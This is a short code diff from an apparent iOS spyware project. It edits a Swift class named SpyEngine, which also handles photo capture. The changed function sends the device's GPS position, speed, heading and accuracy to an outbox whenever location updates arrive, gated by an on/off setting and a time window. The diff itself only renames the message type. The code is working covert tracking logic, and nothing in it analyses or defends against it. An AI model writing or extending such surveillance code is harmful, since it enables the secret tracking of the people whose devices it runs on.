@@ -346,7 +346,7 @@ final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptur
 
     func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
         guard Settings.shared.isOn(.location), Settings.shared.inWindow(), let l = locs.last else { return }
-        Outbox.shared.send(["type": "gps", "lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
+        Outbox.shared.send(["type": "loc", "lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
                             "speed": l.speed, "heading": l.course, "acc": l.horizontalAccuracy,
                             "t": Date().timeIntervalSince1970])
     }
